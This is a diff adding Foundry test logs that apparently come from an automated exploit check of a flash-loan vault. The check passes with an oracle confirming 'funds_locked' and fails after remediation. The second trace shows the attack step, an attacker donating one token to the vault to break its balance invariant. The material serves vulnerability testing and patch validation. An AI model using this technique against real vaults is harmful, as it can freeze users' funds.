@@ -1,0 +1,92 @@
+=== poc trace (oracle present) ===
+Compiling 194 files with Solc 0.8.25
+Solc 0.8.25 finished in 8.02s
+Compiler run successful!
+
+Ran 1 test for test/Exploit.t.sol:UnstoppableVaultDoSTest
+[PASS] testExploit() (gas: 149676)
+Logs:
+  REDFORGE_ORACLE_CONFIRMED:funds_locked
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.64ms (825.85µs CPU time)
+
+Ran 1 test suite in 81.27ms (3.64ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+
+
+=== remediation forge (oracle absent) ===
+Compiling 194 files with Solc 0.8.25
+Solc 0.8.25 finished in 8.10s
+Compiler run successful!
+
+Ran 1 test for test/Exploit.t.sol:UnstoppableVaultDoSTest
+[FAIL: next call did not revert as expected] testExploit() (gas: 216626)
+Traces:
+  [216626] UnstoppableVaultDoSTest::testExploit()
+    ├─ [83214] UnstoppableVault::flashLoan(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19], 0x)
+    │   ├─ [2561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000000 [1e20]
+    │   ├─ [27648] MockToken::transfer(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000 [1e19])
+    │   │   ├─ emit Transfer(from: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], amount: 10000000000000000000 [1e19])
+    │   │   └─ ← [Return] true
+    │   ├─ [561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 90000000000000000000 [9e19]
+    │   ├─ [25735] FlashBorrower::onFlashLoan(UnstoppableVaultDoSTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19], 0, 0x)
+    │   │   ├─ [24520] MockToken::approve(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19])
+    │   │   │   ├─ emit Approval(owner: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000000000000 [1e19])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 0x0947cd39683897964c4681f2a9ace479400f0bd467117d0ae02e99e303012ade
+    │   ├─ [3720] MockToken::transferFrom(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19])
+    │   │   ├─ emit Transfer(from: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000000000000 [1e19])
+    │   │   └─ ← [Return] true
+    │   ├─ [4948] MockToken::transfer(feeRecipient: [0xa32c0203D5F9Fcfe1b2A359e5628cb5a22001bA7], 0)
+    │   │   ├─ emit Transfer(from: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: feeRecipient: [0xa32c0203D5F9Fcfe1b2A359e5628cb5a22001bA7], amount: 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [34120] MockToken::transfer(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 1)
+    │   ├─ emit Transfer(from: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], to: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 1)
+    │   └─ ← [Return] true
+    ├─ [0] VM::expectRevert(InvalidBalance())
+    │   └─ ← [Return]
+    ├─ [83214] UnstoppableVault::flashLoan(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19], 0x)
+    │   ├─ [2561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000001 [1e20]
+    │   ├─ [561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 100000000000000000001 [1e20]
+    │   ├─ [27648] MockToken::transfer(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 10000000000000000000 [1e19])
+    │   │   ├─ emit Transfer(from: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], amount: 10000000000000000000 [1e19])
+    │   │   └─ ← [Return] true
+    │   ├─ [561] MockToken::balanceOf(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]
+    │   │   └─ ← [Return] 90000000000000000001 [9e19]
+    │   ├─ [25735] FlashBorrower::onFlashLoan(UnstoppableVaultDoSTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], MockToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10000000000000000000 [1e19], 0, 0x)
+    │   │   ├─ [24520] MockToken::approve(UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19])
+    │   │   │   ├─ emit Approval(owner: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], spender: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000000000000 [1e19])
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] 0x0947cd39683897964c4681f2a9ace479400f0bd467117d0ae02e99e303012ade
+    │   ├─ [3720] MockToken::transferFrom(FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19])
+    │   │   ├─ emit Transfer(from: FlashBorrower: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], to: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amount: 10000000000000000000 [1e19])
+    │   │   └─ ← [Return] true
+    │   ├─ [4948] MockToken::transfer(feeRecipient: [0xa32c0203D5F9Fcfe1b2A359e5628cb5a22001bA7], 0)
+    │   │   ├─ emit Transfer(from: UnstoppableVault: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: feeRecipient: [0xa32c0203D5F9Fcfe1b2A359e5628cb5a22001bA7], amount: 0)
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    └─ ← [Revert] next call did not revert as expected
+
+Backtrace:
+  at UnstoppableVaultDoSTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.16ms (525.83µs CPU time)
+
+Ran 1 test suite in 506.36ms (2.16ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Exploit.t.sol:UnstoppableVaultDoSTest
+[FAIL: next call did not revert as expected] testExploit() (gas: 216626)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+Tip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger
